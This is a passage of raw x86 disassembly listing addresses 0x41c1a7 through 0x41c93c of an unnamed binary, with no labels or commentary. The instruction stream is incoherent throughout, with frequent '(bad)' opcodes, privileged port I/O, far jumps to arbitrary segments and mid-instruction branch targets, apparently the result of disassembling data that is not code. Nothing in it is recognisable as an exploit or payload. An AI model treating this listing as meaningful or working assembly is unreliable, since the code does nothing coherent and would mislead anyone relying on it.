  41c1a7:	mov    ds:0x8ceccfb5,al
  41c1ac:	and    al,0x5c
  41c1ae:	inc    ecx
  41c1af:	cmp    BYTE PTR [esi+0x64],dh
  41c1b2:	mul    BYTE PTR [edi]
  41c1b4:	and    al,0xa1
  41c1b6:	and    edx,DWORD PTR ds:0x1ea362b4
  41c1bc:	in     al,dx
  41c1bd:	fnstenv [eax+0x42]
  41c1c0:	outs   dx,DWORD PTR ds:[esi]
  41c1c1:	xchg   esi,eax
  41c1c2:	pusha  
  41c1c3:	retf   0x6fe4
  41c1c6:	mov    bh,0x81
  41c1c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1c9:	dec    eax
  41c1ca:	push   es
  41c1cb:	xchg   edx,eax
  41c1cc:	in     al,dx
  41c1cd:	push   es
  41c1ce:	(bad)  
  41c1cf:	jmp    0xf8a7:0x91554cbc
  41c1d6:	push   cs
  41c1d7:	pop    ebx
  41c1d8:	push   0x4d42edd7
  41c1dd:	adc    ebp,DWORD PTR [ebp-0x6c691256]
  41c1e3:	in     eax,dx
  41c1e4:	pop    ebp
  41c1e5:	mov    gs,WORD PTR [edx]
  41c1e7:	mov    eax,0xcf3cff0e
  41c1ec:	jmp    0x132221d0
  41c1f1:	mov    eax,0x2d5b0d21
  41c1f6:	shl    DWORD PTR [ecx],1
  41c1f8:	push   ss
  41c1f9:	inc    esp
  41c1fa:	mov    edx,0xcdef3c9
  41c1ff:	inc    DWORD PTR [eax]
  41c201:	or     ebp,DWORD PTR es:[edx-0x32]
  41c205:	mov    esi,0x1fe3735a
  41c20a:	mov    ah,0x58
  41c20c:	in     eax,0xc3
  41c20e:	jge    0x41c1f5
  41c210:	cmp    dh,dl
  41c212:	call   FWORD PTR gs:[ebx-0x50]
  41c216:	mov    al,ds:0x3ef7745e
  41c21b:	call   0xb46a71ef
  41c220:	and    cl,ah
  41c222:	or     DWORD PTR [esi-0x1925ccc],0xffffffa6
  41c229:	xchg   edi,eax
  41c22a:	pop    ebx
  41c22b:	and    al,0x48
  41c22d:	lods   eax,DWORD PTR ds:[esi]
  41c22e:	push   edi
  41c22f:	mov    esp,0x3ed42a29
  41c234:	(bad)  
  41c235:	mov    dh,0xf4
  41c237:	push   ebp
  41c238:	mov    ds:0x3086d98b,eax
  41c23d:	jae    0x41c1f9
  41c23f:	icebp  
  41c240:	add    cl,BYTE PTR [edi]
  41c242:	psrad  mm1,QWORD PTR ds:0x6fd98d0a
  41c249:	mov    cl,0x40
  41c24b:	sbb    DWORD PTR [ecx],edi
  41c24d:	shl    BYTE PTR [ebp-0x75],1
  41c250:	sahf   
  41c251:	inc    eax
  41c252:	psubb  mm0,mm6
  41c255:	jb     0x41c200
  41c257:	sub    DWORD PTR [ebx-0x19],edi
  41c25a:	ins    BYTE PTR es:[edi],dx
  41c25b:	aad    0x33
  41c25d:	mov    dl,0xea
  41c25f:	inc    edi
  41c260:	xchg   esi,eax
  41c261:	or     esp,0x49
  41c264:	cli    
  41c265:	push   cs
  41c266:	jnp    0x41c2a0
  41c268:	push   edi
  41c269:	fisubr WORD PTR [ebx+0x20]
  41c26c:	hlt    
  41c26d:	jbe    0x41c292
  41c26f:	ins    DWORD PTR es:[edi],dx
  41c270:	pop    edi
  41c271:	sub    al,0x30
  41c273:	fsubrp st(6),st
  41c275:	push   es
  41c276:	push   edx
  41c277:	pop    esp
  41c278:	mov    esi,0x910704dc
  41c27d:	sbb    DWORD PTR [eax],eax
  41c27f:	cmp    DWORD PTR [ebp+0x7ac32a80],ebx
  41c285:	and    edx,ebp
  41c287:	jno    0x41c299
  41c289:	sbb    dh,BYTE PTR [ebx]
  41c28b:	push   ds
  41c28c:	push   ebp
  41c28d:	push   ebp
  41c28e:	les    edi,FWORD PTR [eax+esi*1]
  41c291:	jmp    0xb847f2a
  41c296:	adc    DWORD PTR [ebx-0x288cb9cf],edi
  41c29c:	mov    bl,0x4e
  41c29e:	inc    edi
  41c29f:	daa    
  41c2a0:	stos   BYTE PTR es:[edi],al
  41c2a1:	pop    ecx
  41c2a2:	mov    ah,0x7
  41c2a4:	pushf  
  41c2a5:	fwait
  41c2a6:	xor    eax,0x162c1f2
  41c2ab:	lock xor ecx,DWORD PTR [ecx-0x75203b51]
  41c2b2:	and    eax,0x63a98580
  41c2b7:	jb     0x41c25d
  41c2b9:	pmaddwd mm5,QWORD PTR [edx+ebx*2-0xe79dae6]
  41c2c1:	push   ss
  41c2c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2c3:	sub    eax,0x6066b111
  41c2c8:	fprem1 
  41c2ca:	shl    BYTE PTR [ebx],1
  41c2cc:	mov    ecx,ebp
  41c2ce:	push   ecx
  41c2cf:	stos   DWORD PTR es:[edi],eax
  41c2d0:	std    
  41c2d1:	popf   
  41c2d2:	mov    eax,ds:0x70c84c80
  41c2d7:	dec    esi
  41c2d8:	popa   
  41c2d9:	adc    al,0x10
  41c2db:	lea    edx,[ecx-0x65]
  41c2de:	xor    bl,ch
  41c2e0:	popa   
  41c2e1:	out    dx,eax
  41c2e2:	call   0x1f3a:0x18224244
  41c2e9:	rcr    ah,1
  41c2eb:	dec    ebp
  41c2ec:	leave  
  41c2ed:	mov    ds,esi
  41c2ef:	lods   eax,DWORD PTR ds:[esi]
  41c2f0:	sub    bl,BYTE PTR [ecx+0x5c4a120b]
  41c2f6:	jmp    0xfd2a:0x3ea83c21
  41c2fd:	inc    esi
  41c2fe:	mov    al,ds:0x177f31c9
  41c303:	sub    edi,DWORD PTR [ebp-0x6e08488f]
  41c309:	adc    BYTE PTR [ebp+0x182f1b0c],0x60
  41c310:	psrlq  mm7,QWORD PTR ds:0xabf4d73e
  41c317:	lock inc edi
  41c319:	mov    ds:0x29fa1040,eax
  41c31e:	jecxz  0x41c342
  41c320:	and    bh,BYTE PTR [esi]
  41c322:	stos   BYTE PTR es:[edi],al
  41c323:	repnz adc al,0xd3
  41c326:	push   ss
  41c327:	cmc    
  41c328:	add    esp,DWORD PTR [edi+0x932063f]
  41c32e:	int3   
  41c32f:	sub    eax,0xe863b30c
  41c334:	or     BYTE PTR [ebp-0x203a14c8],cl
  41c33a:	mov    al,ds:0x5e97568d
  41c33f:	les    ebx,FWORD PTR [eax+0x71844f3b]
  41c345:	lods   al,BYTE PTR ds:[esi]
  41c346:	pop    edi
  41c347:	push   es
  41c348:	push   0x49
  41c34a:	sbb    BYTE PTR [ecx+0x775c6bca],bh
  41c350:	mov    ss,WORD PTR [edi+eax*1]
  41c353:	mov    edi,0xf6320c16
  41c358:	xchg   esp,eax
  41c359:	vpand  xmm5,xmm1,XMMWORD PTR [edx]
  41c35d:	jge    0x41c341
  41c35f:	retf   0xac48
  41c362:	out    dx,eax
  41c363:	pop    edi
  41c364:	shl    BYTE PTR [edx+0xd6d562a],1
  41c36a:	cmp    dh,al
  41c36c:	(bad)  
  41c36d:	scas   eax,DWORD PTR es:[edi]
  41c36e:	shr    ecx,1
  41c370:	sbb    ch,BYTE PTR [edi+0x20660693]
  41c376:	dec    ebp
  41c377:	int3   
  41c378:	sub    ebp,DWORD PTR [esi+eax*4+0x2e]
  41c37c:	push   ss
  41c37d:	rcl    cl,1
  41c37f:	xor    ebx,0xe48b4fae
  41c385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c386:	dec    esi
  41c387:	adc    ah,BYTE PTR [esp+ebx*8]
  41c38a:	call   0xe23b828a
  41c38f:	add    dh,BYTE PTR [edx+0x2]
  41c392:	data16 fucomi st,st(0)
  41c395:	xchg   esi,eax
  41c396:	sbb    BYTE PTR [ecx],bh
  41c398:	cmp    bh,BYTE PTR [eax]
  41c39a:	push   esp
  41c39b:	call   0x117d:0x9201e719
  41c3a2:	ror    DWORD PTR [ebp-0x1c3133a7],0xcb
  41c3a9:	cmp    eax,0xb170cfcc
  41c3ae:	hlt    
  41c3af:	aas    
  41c3b0:	mov    WORD PTR [edx],ds
  41c3b2:	inc    ebp
  41c3b3:	and    BYTE PTR [eax],dl
  41c3b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3b6:	adc    DWORD PTR [ebx+0x74ecde0],esp
  41c3bc:	push   ecx
  41c3bd:	icebp  
  41c3be:	and    eax,0x53f52915
  41c3c3:	dec    ecx
  41c3c4:	inc    ecx
  41c3c5:	pop    ebp
  41c3c6:	or     al,0xd0
  41c3c8:	lea    ecx,fs:[ebx-0x634f4e92]
  41c3cf:	cmp    BYTE PTR ds:0x4c2a62ed,bl
  41c3d5:	add    esp,0xa
  41c3d8:	sahf   
  41c3d9:	pop    edx
  41c3da:	(bad)  
  41c3dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3dd:	jg     0x41c416
  41c3df:	pop    edi
  41c3e0:	adc    ebx,DWORD PTR [esi]
  41c3e2:	sub    ebx,ebx
  41c3e4:	inc    ebx
  41c3e5:	and    esi,DWORD PTR [esi]
  41c3e7:	jo     0x41c3a8
  41c3e9:	mov    ebx,0x9e216acb
  41c3ee:	add    DWORD PTR ds:0x58bdf592,ecx
  41c3f4:	push   0x2e5d9aff
  41c3f9:	xor    al,0x12
  41c3fb:	(bad)  
  41c3fd:	stos   BYTE PTR es:[edi],al
  41c3fe:	mov    ds:0x61bea63e,al
  41c403:	and    BYTE PTR [ecx-0x5707912],bl
  41c409:	loop   0x41c42f
  41c40b:	aas    
  41c40c:	push   esp
  41c40d:	mov    DWORD PTR [esi],esi
  41c40f:	xchg   BYTE PTR [ebp-0x12],bh
  41c412:	cmp    dl,BYTE PTR [ebx+0x10]
  41c415:	sahf   
  41c416:	mov    bl,0x48
  41c418:	stos   DWORD PTR es:[edi],eax
  41c419:	push   es
  41c41a:	cld    
  41c41b:	xchg   ebx,eax
  41c41c:	cld    
  41c41d:	sar    bh,cl
  41c41f:	jmp    0x99b:0x3a1a808d
  41c426:	dec    eax
  41c427:	mov    ?,WORD PTR [esi-0x56d99726]
  41c42d:	adc    eax,DWORD PTR [eax+0x66]
  41c430:	jae    0x41c3c8
  41c432:	cmp    ebp,DWORD PTR [edi+0x5]
  41c435:	sub    ch,BYTE PTR ds:0x408966a0
  41c43b:	inc    eax
  41c43c:	dec    ebx
  41c43d:	imul   ecx,DWORD PTR [edx-0x6b84566c],0xc
  41c444:	pusha  
  41c445:	outs   dx,DWORD PTR ds:[esi]
  41c446:	and    ah,dl
  41c448:	and    BYTE PTR [edx+0x34],dh
  41c44b:	in     al,dx
  41c44c:	adc    DWORD PTR [ebx],0x877a21cb
  41c452:	pop    edi
  41c453:	mov    BYTE PTR ds:0xba171351,0x80
  41c45a:	test   al,0xd7
  41c45c:	add    al,0x98
  41c45e:	out    dx,eax
  41c45f:	dec    ebp
  41c460:	(bad)  
  41c461:	enter  0x302c,0xe6
  41c465:	inc    edi
  41c466:	stc    
  41c467:	icebp  
  41c468:	sub    al,0x9e
  41c46a:	aad    0xe3
  41c46c:	jno    0x41c4bf
  41c46e:	and    edx,DWORD PTR [ecx]
  41c470:	ss add dh,ch
  41c473:	enter  0x128,0xa6
  41c477:	pop    es
  41c478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c479:	(bad)  
  41c47a:	bound  edx,QWORD PTR [di]
  41c47d:	pop    ss
  41c47e:	xchg   ecx,eax
  41c47f:	cwde   
  41c480:	mov    al,0x98
  41c482:	(bad)  
  41c484:	fidiv  DWORD PTR [esi+ecx*1]
  41c487:	ficomp DWORD PTR [ebx+0x7a4648d]
  41c48d:	int3   
  41c48e:	add    DWORD PTR [ebp+0x68659401],ecx
  41c494:	lds    ebp,FWORD PTR [esi+ebx*1]
  41c497:	and    eax,DWORD PTR [eax+edi*1+0x59467b02]
  41c49e:	fs jmp 0xadf8:0xf5b897bd
  41c4a6:	mov    al,0x90
  41c4a8:	test   DWORD PTR ds:0xf2878bc5,edx
  41c4ae:	sbb    cl,BYTE PTR [ebp+0x6ea6a4a3]
  41c4b4:	sbb    eax,DWORD PTR [edi-0x28]
  41c4b7:	shl    BYTE PTR [ebx],1
  41c4b9:	icebp  
  41c4ba:	pop    es
  41c4bb:	mov    esp,edx
  41c4bd:	call   0x652c2e53
  41c4c2:	cli    
  41c4c3:	ins    BYTE PTR es:[edi],dx
  41c4c4:	arpl   WORD PTR [esi-0x1e],dx
  41c4c7:	xor    BYTE PTR [ebp-0x3e252c39],bl
  41c4cd:	in     al,0xb8
  41c4cf:	retf   0x4302
  41c4d2:	adc    BYTE PTR [edx-0x61],0xc0
  41c4d6:	inc    ebx
  41c4d7:	aas    
  41c4d8:	inc    esp
  41c4d9:	xor    al,0xbd
  41c4db:	(bad)  
  41c4dd:	popf   
  41c4de:	dec    ecx
  41c4df:	out    dx,eax
  41c4e0:	in     eax,0x1f
  41c4e2:	lock stos DWORD PTR es:[edi],eax
  41c4e4:	push   edx
  41c4e5:	std    
  41c4e6:	pop    edi
  41c4e7:	pop    eax
  41c4e8:	xchg   BYTE PTR [ebp-0x155e4473],dh
  41c4ee:	inc    esi
  41c4ef:	adc    BYTE PTR [ebp-0x70],ah
  41c4f2:	cmc    
  41c4f3:	faddp  st(6),st
  41c4f5:	mov    al,ds:0x8a57baec
  41c4fa:	mov    bl,0xab
  41c4fc:	retf   0x9c29
  41c4ff:	popa   
  41c500:	mov    bh,0x7e
  41c502:	xlat   BYTE PTR ds:[ebx]
  41c503:	and    BYTE PTR [esp+ebp*1+0x1baa90ff],ch
  41c50a:	push   ds
  41c50b:	or     DWORD PTR ds:0x7dd187e8,ebx
  41c511:	inc    ebp
  41c512:	cmp    al,0xf8
  41c514:	mov    dl,0xbe
  41c516:	call   0xbdb:0x51de0e39
  41c51d:	outs   dx,DWORD PTR ds:[esi]
  41c51e:	or     edi,DWORD PTR [ebx-0x14863fe2]
  41c524:	dec    ebx
  41c525:	arpl   bp,bp
  41c527:	lahf   
  41c528:	lea    esp,[edi-0x1a103092]
  41c52e:	sub    dh,BYTE PTR ds:0x1add9ebe
  41c534:	mov    gs,WORD PTR [esi+0x23]
  41c537:	pop    esi
  41c538:	mov    al,ds:0x4b35fc4d
  41c53d:	jb     0x41c4f8
  41c53f:	fist   DWORD PTR [edx+edi*8]
  41c542:	mov    ecx,0xaad34b02
  41c547:	xor    BYTE PTR [eax+0x5d26cb65],dh
  41c54d:	ret    
  41c54e:	lods   al,BYTE PTR ds:[esi]
  41c54f:	inc    esi
  41c550:	dec    DWORD PTR [edi+0x35032a11]
  41c556:	mov    ds:0x7c7458d3,eax
  41c55b:	jmp    0x41c52f
  41c55d:	neg    BYTE PTR [ebx+0x5deea349]
  41c563:	mov    al,ds:0x9bdd890c
  41c568:	sub    al,0xbb
  41c56a:	and    dl,BYTE PTR [ecx]
  41c56c:	icebp  
  41c56d:	retf   0xc08b
  41c570:	clc    
  41c571:	loopne 0x41c5b4
  41c573:	sub    BYTE PTR [esi-0x45e0fdee],cl
  41c579:	jle    0x41c555
  41c57b:	shr    BYTE PTR [ecx+0x7a1e53de],cl
  41c581:	pusha  
  41c582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c583:	in     al,dx
  41c584:	les    ebp,FWORD PTR [ecx]
  41c586:	sub    al,0x4e
  41c588:	xchg   ebx,eax
  41c589:	and    esp,ebx
  41c58b:	retf   0x9a6
  41c58e:	fisttp QWORD PTR [ebp-0x446f9c78]
  41c594:	cld    
  41c595:	adc    dl,BYTE PTR [ecx-0x39612f89]
  41c59b:	lods   al,BYTE PTR ds:[esi]
  41c59c:	sub    edx,DWORD PTR [edx-0x5cb91bbb]
  41c5a2:	gs (bad) 
  41c5a5:	dec    edx
  41c5a6:	push   edi
  41c5a7:	xchg   ebp,eax
  41c5a8:	and    BYTE PTR [esi-0x63],0x7e
  41c5ac:	and    al,0xaf
  41c5ae:	shr    BYTE PTR [ebx+0x1ad4c753],0x72
  41c5b5:	int3   
  41c5b6:	jle    0x41c60b
  41c5b8:	out    0xc1,eax
  41c5ba:	mov    edx,DWORD PTR [ecx]
  41c5bc:	and    BYTE PTR [edx],dl
  41c5be:	scas   eax,DWORD PTR es:[edi]
  41c5bf:	sahf   
  41c5c0:	shl    al,cl
  41c5c2:	test   al,0x1c
  41c5c4:	clc    
  41c5c5:	out    0x2a,eax
  41c5c7:	pop    ebp
  41c5c8:	hlt    
  41c5c9:	jns    0x41c605
  41c5cb:	xlat   BYTE PTR ds:[ebx]
  41c5cc:	ss or  al,cl
  41c5cf:	test   ch,ch
  41c5d1:	rol    BYTE PTR [edi+0x47],1
  41c5d4:	inc    esp
  41c5d5:	clc    
  41c5d6:	out    dx,eax
  41c5d7:	xchg   ebp,eax
  41c5d8:	jge    0x41c5bf
  41c5da:	mov    eax,ds:0xc368940d
  41c5df:	call   0x4e91:0xccf28992
  41c5e6:	jge    0x41c610
  41c5e8:	push   edx
  41c5e9:	jge    0x41c5f0
  41c5eb:	add    eax,0xcfd631e0
  41c5f0:	gs test al,0x2
  41c5f3:	aad    0x8a
  41c5f5:	adc    BYTE PTR [ebx+0x623a83ac],cl
  41c5fb:	or     al,0x10
  41c5fd:	fiadd  WORD PTR [esi+0x4f5c8fb]
  41c603:	pop    esp
  41c604:	push   0x5a89ef
  41c609:	aas    
  41c60a:	mov    ds:0x546fcf4c,eax
  41c60f:	mov    edi,0x581c59e4
  41c614:	inc    ebx
  41c615:	jne    0x41c5cc
  41c617:	and    BYTE PTR [edi],al
  41c619:	push   edi
  41c61a:	or     DWORD PTR [esi],ebp
  41c61c:	stos   BYTE PTR es:[edi],al
  41c61d:	inc    esi
  41c61e:	push   0x123202c5
  41c623:	iret   
  41c624:	jbe    0x41c5bb
  41c626:	cmovle ecx,DWORD PTR [ebx-0x7]
  41c62a:	mov    al,ds:0xf4e9996
  41c62f:	dec    ebx
  41c630:	mov    ecx,0xbd830491
  41c635:	jg     0x41c5eb
  41c637:	sub    BYTE PTR [eax+0x7a],ah
  41c63a:	popa   
  41c63b:	aas    
  41c63c:	enter  0x2482,0x2
  41c640:	repnz lods eax,DWORD PTR ds:[esi]
  41c642:	pop    DWORD PTR [edi+edx*2]
  41c645:	dec    esi
  41c646:	fwait
  41c647:	es cmp eax,0x7a6fdcff
  41c64d:	xchg   DWORD PTR [ebp+0x6c19206],ebp
  41c653:	in     al,0xa1
  41c655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c656:	push   ss
  41c657:	(bad)  
  41c658:	les    edx,FWORD PTR [ecx+0x41c52de5]
  41c65e:	call   0xb4a7:0xf697e855
  41c665:	and    ecx,ebx
  41c667:	xchg   edi,eax
  41c668:	push   cs
  41c669:	ret    0x408c
  41c66c:	out    dx,eax
  41c66d:	xor    eax,0x28370647
  41c672:	sub    cl,bl
  41c674:	bound  edi,QWORD PTR [edi-0x14]
  41c677:	imul   esp,DWORD PTR [ebx+ecx*4-0x224f2fec],0xc9c16bd4
  41c682:	scas   al,BYTE PTR es:[edi]
  41c683:	mov    edi,DWORD PTR [ebp+0x7c]
  41c686:	mov    ebp,0x211f9650
  41c68b:	pusha  
  41c68c:	(bad)  
  41c68d:	std    
  41c68e:	pop    es
  41c68f:	sub    eax,0x25026373
  41c694:	mov    ebp,0x637e49d1
  41c699:	jmp    0x41c66c
  41c69b:	fisttp WORD PTR [edx]
  41c69d:	mov    ecx,0xee2808c4
  41c6a2:	icebp  
  41c6a3:	jg     0x41c69e
  41c6a5:	add    BYTE PTR [edx],bl
  41c6a7:	adc    DWORD PTR [eax-0x44],esi
  41c6aa:	imul   ebp,DWORD PTR [ebp-0x6e],0xc4b5eca7
  41c6b1:	adc    DWORD PTR [eax],esp
  41c6b3:	sbb    DWORD PTR [edi+0x7],ebx
  41c6b6:	test   eax,0x913d500e
  41c6bb:	test   eax,0x36bf2a6b
  41c6c0:	mov    ds:0x8b95e308,eax
  41c6c5:	jecxz  0x41c6ba
  41c6c7:	(bad)  [ecx+0x4e17a1df]
  41c6cd:	jmp    0x1692:0xe7a39d2d
  41c6d4:	xor    ebx,ebx
  41c6d6:	inc    edi
  41c6d7:	sub    al,0x97
  41c6d9:	xchg   ebx,eax
  41c6da:	sbb    eax,0x870e5c98
  41c6df:	cmp    esp,ebp
  41c6e1:	dec    esp
  41c6e2:	lock int3 
  41c6e4:	vmovlpd xmm3,xmm4,QWORD PTR [edi]
  41c6e8:	mov    ds:0x4de86ec6,eax
  41c6ed:	nop    DWORD PTR [ecx]
  41c6f0:	(bad)  
  41c6f2:	mov    ah,0x53
  41c6f4:	xor    DWORD PTR [edx+eiz*2],edx
  41c6f7:	enter  0x7887,0xf6
  41c6fb:	dec    edx
  41c6fc:	not    DWORD PTR [ecx]
  41c6fe:	jns    0x41c74b
  41c700:	mov    bl,0x8c
  41c702:	sbb    BYTE PTR [ebx+ebx*4],ch
  41c705:	cwde   
  41c706:	clc    
  41c707:	push   eax
  41c708:	mov    esp,0x4cafdd96
  41c70d:	xchg   esp,eax
  41c70e:	xor    edi,DWORD PTR [esi+eax*4-0x31]
  41c712:	add    BYTE PTR [ecx],0xe7
  41c715:	xlat   BYTE PTR ds:[ebx]
  41c716:	adc    eax,0x99f18627
  41c71b:	jnp    0x41c6b4
  41c71d:	pop    ebx
  41c71e:	call   0x9815f6d5
  41c723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c724:	in     al,0x6f
  41c726:	sbb    esp,ecx
  41c728:	mov    al,0xc2
  41c72a:	scas   eax,DWORD PTR es:[edi]
  41c72b:	adc    BYTE PTR [ebx],0x4c
  41c72e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c72f:	jmp    0x5749d0d7
  41c734:	jns    0x41c76c
  41c736:	retf   0xa6d2
  41c739:	adc    esi,DWORD PTR [ecx]
  41c73b:	jge    0x41c6e4
  41c73d:	ins    BYTE PTR es:[edi],dx
  41c73e:	sub    ch,bl
  41c740:	dec    edi
  41c741:	push   ebx
  41c742:	pop    esi
  41c743:	out    0x2d,al
  41c745:	mov    bh,dl
  41c747:	push   es
  41c748:	sub    DWORD PTR [esi+edi*1],0x17
  41c74c:	(bad)  
  41c74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c74f:	push   ecx
  41c750:	fs jne 0x41c6de
  41c753:	jg     0x41c7b5
  41c755:	jns    0x41c755
  41c757:	xacquire xrelease xchg DWORD PTR [esi-0x7270ab40],esi
  41c75f:	jp     0x41c7ba
  41c761:	inc    edi
  41c762:	sbb    BYTE PTR [edi+edi*1],0x83
  41c766:	rcr    bh,0x3e
  41c769:	ins    BYTE PTR es:[edi],dx
  41c76a:	inc    edx
  41c76b:	cld    
  41c76c:	xor    al,0x92
  41c76e:	call   FWORD PTR [esi]
  41c770:	push   ecx
  41c771:	lea    ebx,[edi+0x25bc8848]
  41c777:	jo     0x41c777
  41c779:	xchg   ebp,eax
  41c77a:	and    DWORD PTR [ecx],0x2f
  41c77d:	call   0xdfe552d3
  41c782:	out    dx,al
  41c783:	popa   
  41c784:	sub    BYTE PTR [edi-0x6bc06508],ch
  41c78a:	sbb    ah,BYTE PTR [esi*8+0x26417d34]
  41c791:	add    DWORD PTR ds:0xd4be2e53,eax
  41c797:	fld    QWORD PTR [edx-0x20]
  41c79a:	out    0x59,eax
  41c79c:	ja     0x41c7cd
  41c79e:	sbb    al,0xb9
  41c7a0:	mov    ch,0x1
  41c7a2:	pop    ss
  41c7a3:	jg     0x41c7bf
  41c7a5:	pop    es
  41c7a6:	jp     0x41c7f4
  41c7a8:	cwde   
  41c7a9:	push   eax
  41c7aa:	stos   BYTE PTR es:[edi],al
  41c7ab:	aaa    
  41c7ac:	lahf   
  41c7ad:	and    eax,0x934033d5
  41c7b2:	xchg   edi,eax
  41c7b3:	xor    ah,BYTE PTR [ebp*4+0x68d6dd3d]
  41c7ba:	mov    ecx,0x41ea50c5
  41c7bf:	cld    
  41c7c0:	and    BYTE PTR [eax],dh
  41c7c2:	jl     0x41c7ba
  41c7c4:	adc    BYTE PTR [eax+edi*8+0x346d90b6],ah
  41c7cb:	jmp    0xbb19:0x6ccdec75
  41c7d2:	ins    DWORD PTR es:[edi],dx
  41c7d3:	ret    
  41c7d4:	in     al,0x52
  41c7d6:	mov    ah,0x8
  41c7d8:	shr    BYTE PTR [esi+ebx*4+0x4c],1
  41c7dc:	mov    ch,0x38
  41c7de:	dec    edi
  41c7df:	cmp    eax,0xb0bfc9a8
  41c7e4:	lds    ebx,FWORD PTR [edx-0x71]
  41c7e7:	sbb    DWORD PTR [edi+0x7d4c5dc4],0x44
  41c7ee:	sub    DWORD PTR [edi+ebx*4],eax
  41c7f1:	xor    BYTE PTR [ecx],dl
  41c7f3:	clc    
  41c7f4:	or     BYTE PTR [edx-0x27],0xe6
  41c7f8:	sbb    ebx,ebx
  41c7fa:	int3   
  41c7fb:	imul   ebx,DWORD PTR [edi],0xffffffd3
  41c7fe:	jge    0x41c81f
  41c800:	xchg   ebp,eax
  41c801:	test   al,0x54
  41c803:	jmp    0x41c83f
  41c805:	mov    bh,BYTE PTR [edi-0x7d]
  41c808:	bound  eax,QWORD PTR [edx-0x54]
  41c80b:	rcr    DWORD PTR [esi-0x339f17e6],1
  41c811:	addr16 fdivr st(2),st
  41c814:	push   ecx
  41c815:	or     DWORD PTR [ebx-0x3],0xffffffaa
  41c819:	popf   
  41c81a:	mov    WORD PTR [esi+0x79f741c2],?
  41c820:	and    eax,0x7dec388c
  41c825:	sub    DWORD PTR [eax],esp
  41c827:	aaa    
  41c828:	sub    ecx,DWORD PTR [ebx+ebp*8+0x2235d0ab]
  41c82f:	inc    ebp
  41c830:	sub    dh,al
  41c832:	dec    eax
  41c833:	jl     0x41c889
  41c835:	(bad)  
  41c836:	pop    edx
  41c837:	fsubr  QWORD PTR [eax]
  41c839:	cmp    DWORD PTR [edi+0x6f],ecx
  41c83c:	imul   edx,DWORD PTR [esi-0x3528e4d9],0x78
  41c843:	or     al,0xe3
  41c845:	xor    DWORD PTR [eax-0x6f7b6a83],ecx
  41c84b:	sbb    eax,DWORD PTR [ecx+0x2f405945]
  41c851:	xor    DWORD PTR [ebx-0x14],esi
  41c854:	aaa    
  41c855:	out    dx,al
  41c856:	pop    esi
  41c857:	(bad)  
  41c858:	addr16 test eax,0x51016a39
  41c85e:	int3   
  41c85f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c860:	jl     0x41c838
  41c862:	jg     0x41c817
  41c864:	rol    esp,1
  41c866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c867:	sub    edi,ebp
  41c869:	pop    ds
  41c86a:	inc    ecx
  41c86b:	in     al,0x7c
  41c86d:	mov    DWORD PTR [edx],ecx
  41c86f:	inc    eax
  41c870:	xor    BYTE PTR [ecx+0x2a],bl
  41c873:	jge    0x41c8c2
  41c875:	std    
  41c876:	push   cs
  41c877:	push   cs
  41c878:	dec    esp
  41c879:	arpl   dx,si
  41c87b:	xor    al,0x6a
  41c87d:	loop   0x41c862
  41c87f:	fwait
  41c880:	das    
  41c881:	add    eax,0x86e53e48
  41c886:	sub    BYTE PTR [ebx+eax*2+0xf],ah
  41c88a:	and    ch,BYTE PTR [edx+0x4]
  41c88d:	add    al,ch
  41c88f:	cwde   
  41c890:	add    DWORD PTR [edx-0x2df86121],ebx
  41c896:	sbb    BYTE PTR [edx-0x20cffa9e],ch
  41c89c:	and    bh,ch
  41c89e:	sahf   
  41c89f:	cli    
  41c8a0:	sbb    DWORD PTR [ebx+ebp*2+0x85a0365],edx
  41c8a7:	add    edx,DWORD PTR [edi-0xf]
  41c8aa:	sbb    dl,BYTE PTR ds:0xbfe7e69c
  41c8b0:	in     eax,0xd9
  41c8b2:	sti    
  41c8b3:	push   esp
  41c8b4:	ret    0x5f18
  41c8b7:	shl    BYTE PTR [edx],cl
  41c8b9:	jns    0x41c858
  41c8bb:	mov    bh,0x5a
  41c8bd:	out    dx,eax
  41c8be:	xchg   edx,eax
  41c8bf:	jg     0x41c904
  41c8c1:	fldcw  WORD PTR [eax]
  41c8c3:	add    ah,BYTE PTR [ebx]
  41c8c5:	rcl    DWORD PTR [eax+ebx*1+0x65387ba9],0x47
  41c8cd:	and    esi,DWORD PTR [edx+ebp*2+0x7c544d89]
  41c8d4:	push   cs
  41c8d5:	ret    0xcb95
  41c8d8:	mov    ds:0xabba678d,eax
  41c8dd:	dec    ebp
  41c8de:	jns    0x41c8e0
  41c8e0:	(bad)  
  41c8e1:	xchg   BYTE PTR es:[edx],ch
  41c8e4:	mov    bl,BYTE PTR [esi-0x22213065]
  41c8ea:	xor    ebx,ebx
  41c8ec:	aam    0x8f
  41c8ee:	inc    edx
  41c8ef:	in     eax,dx
  41c8f0:	arpl   WORD PTR [eax+0x1307efd],di
  41c8f6:	xor    esp,ecx
  41c8f8:	stos   BYTE PTR es:[edi],al
  41c8f9:	mov    fs,edx
  41c8fb:	out    0xa1,al
  41c8fd:	sub    DWORD PTR ds:0x774816f3,ebx
  41c903:	push   edx
  41c904:	add    bl,dh
  41c906:	pop    ebp
  41c907:	jmp    0x51cc81dc
  41c90c:	fsubr  st(7),st
  41c90e:	test   BYTE PTR [edi+0xa904c90],al
  41c914:	aas    
  41c915:	fld    QWORD PTR [ecx+0x24b08fd9]
  41c91b:	mov    dl,0x44
  41c91d:	jmp    0x4902e2e5
  41c922:	xchg   esi,eax
  41c923:	out    0x95,eax
  41c925:	not    ebx
  41c927:	pop    es
  41c928:	sub    ah,0x72
  41c92b:	inc    edi
  41c92c:	(bad)  
  41c92d:	push   edi
  41c92e:	xor    bh,BYTE PTR [esi+0x61060f23]
  41c934:	add    dl,ah
  41c936:	bound  edi,QWORD PTR [edi+0x4f0674cc]
  41c93c:	mov    ch,0xc3
